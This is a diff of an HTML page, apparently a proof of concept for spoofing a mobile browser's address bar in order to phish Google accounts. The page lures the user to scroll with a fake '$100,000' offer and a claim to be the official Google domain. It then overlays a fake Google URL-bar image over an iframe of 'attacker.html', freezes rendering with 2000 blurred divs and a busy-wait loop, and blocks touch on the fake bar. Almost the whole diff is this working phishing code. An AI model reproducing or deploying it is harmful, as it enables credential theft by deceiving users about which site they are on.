@@ -2,113 +2,124 @@
 <html lang="en">
   <head>
     <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
+    />
     <title>azzzab</title>
     <style>
-      html, body {
-        margin: 0; padding: 0; width: 100%; height: 100%;
-        background-color: #f8f9fa; overflow: hidden; /* Lock root */
-      }
-
-      /* Container Utama yang kita manipulasi */
-      #viewport {
+      body,
+      html {
+        margin: 0;
+        padding: 0;
         width: 100%;
-        height: 100%;
-        overflow-y: scroll;
-        -webkit-overflow-scrolling: touch; /* Smooth scroll buat iOS */
-        overscroll-behavior: none;
+        height: 200vh;
+        background-color: #f8f9fa;
+        font-family: sans-serif;
+        scroll-behavior: smooth;
+        overflow-x: hidden;
       }
-
-      /* Content harus sedikit lebih panjang dari layar agar scroll 'aktif' tapi gak mentok */
-      #content-wrapper {
-        height: 101vh; 
-        position: relative;
-      }
-
       #scroll-bait {
-        display: flex; flex-direction: column; align-items: center;
-        justify-content: center; height: 100vh; text-align: center;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        height: 100vh;
+        text-align: center;
+        color: #5f6368;
+        padding: 20px;
       }
-
       #fake-ui {
-        display: none; position: fixed; top: 0; left: 0;
-        width: 100vw; height: 100vh; z-index: 99999; background: #fff;
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh;
+        z-index: 99999;
+        background: #fff;
       }
-
       #fake-bar {
-        position: absolute; bottom: 0; left: 0; width: 100%;
-        height: 56px; object-fit: contain; z-index: 100;
-        opacity: 0; pointer-events: none; touch-action: none;
+        position: absolute;
+        bottom: 0;
+        left: 0;
+        width: 100%;
+        height: 56px;
+        object-fit: contain;
+        border-bottom: 1px solid #ddd;
+        z-index: 10;
+        opacity: 0;
+        transition: opacity 0.1s ease-in;
+        pointer-events: none;
       }
-
       #fake-content {
-        position: absolute; top: 0; left: 0; width: 100%;
-        height: 100vh; border: none; z-index: 1;
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100vh;
+        border: none;
+        z-index: 1;
+        display: block;
+        transition:
+          top 0.1s ease-in,
+          height 0.1s ease-in;
       }
-
-      #gpu-killer { position: fixed; top: 0; left: 0; width: 1px; height: 1px; pointer-events: none; }
+      #gpu-killer {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 1px;
+        height: 1px;
+        pointer-events: none;
+        z-index: 1;
+      }
     </style>
   </head>
   <body>
-
-    <div id="viewport">
-        <div id="content-wrapper">
-            <div id="scroll-bait">
-                <h2>Scroll down to verify domain...</h2>
-                <div style="font-size: 50px; color: #1a73e8;">↓</div>
-            </div>
-        </div>
+    <div id="scroll-bait">
+      <h2>
+        This is the official Google domain. Want to earn $100,000? Follow these
+        instructions. Please scroll down to the bottom of this page to proceed
+        to accounts.google.com.
+      </h2>
+      <div style="font-size: 50px; color: #1a73e8; margin-top: 30px">↓</div>
     </div>
-
     <div id="gpu-killer"></div>
-
     <div id="fake-ui">
-      <img id="fake-bar" src="urlbar-google.jpg" />
+      <img id="fake-bar" src="urlbar-google.jpg" alt="Google Address Bar" />
       <iframe id="fake-content" src="attacker.html"></iframe>
     </div>
 
     <script>
       let isSpoofed = false;
-      const vp = document.getElementById("viewport");
 
       function triggerMeltdown() {
-        const killer = document.getElementById("gpu-killer");
+        const killerContainer = document.getElementById("gpu-killer");
         for (let i = 0; i < 2000; i++) {
           let div = document.createElement("div");
-          div.style.cssText = `position:absolute; width:100vw; height:1vh; backdrop-filter:blur(10px);`;
-          killer.appendChild(div);
+          div.style.cssText = `position:absolute; width:200vw; height:10vh; background:rgba(0,0,0,0.01); backdrop-filter:blur(10px) contrast(200%); transform:rotate(${Math.random() * 360}deg);`;
+          killerContainer.appendChild(div);
         }
         let start = Date.now();
-        while (Date.now() - start < 450) {} 
+        while (Date.now() - start < 400) {}
       }
 
-      // RAHASIA UTAMA: Anti-Mentok Logic
-      vp.addEventListener("scroll", () => {
-          if (!isSpoofed && vp.scrollTop > 50) {
-              isSpoofed = true;
-              document.getElementById("fake-ui").style.display = "block";
-              triggerMeltdown();
-              // Reset ke posisi 'aman' (bukan 0)
-              vp.scrollTop = 5; 
+      window.addEventListener(
+        "scroll",
+        () => {
+          if (window.scrollY > 80 && !isSpoofed) {
+            isSpoofed = true;
+            document.getElementById("fake-ui").style.display = "block";
+            triggerMeltdown();
+            window.scrollTo(0, 0);
+            setTimeout(() => {
+              document.getElementById("gpu-killer").innerHTML = "";
+            }, 1000);
           }
-
-          if (isSpoofed) {
-              // Jika user coba scroll up sampai mentok (0), paksa balik ke 1px
-              if (vp.scrollTop <= 0) {
-                  vp.scrollTop = 1;
-              }
-              // Jika user coba scroll down sampai mentok, paksa naik 1px
-              if (vp.scrollTop + vp.offsetHeight >= vp.scrollHeight) {
-                  vp.scrollTop = vp.scrollHeight - vp.offsetHeight - 1;
-              }
-          }
-      });
-
-      // Blokir total interaksi pada Fake Bar Image
-      const fb = document.getElementById("fake-bar");
-      ['touchstart', 'touchmove', 'touchend'].forEach(evt => {
-          fb.addEventListener(evt, (e) => e.preventDefault(), { passive: false });
-      });
+        },
+        { passive: true },
+      );
 
       window.addEventListener("message", (e) => {
         if (e.data === "SNAP_TRAP") {
@@ -120,6 +131,14 @@
           fakeContent.style.height = "calc(100vh - 56px)";
         }
       });
+
+      document.getElementById("fake-bar").addEventListener(
+        "touchmove",
+        (e) => {
+          if (isSpoofed) e.preventDefault();
+        },
+        { passive: false },
+      );
     </script>
   </body>
 </html>
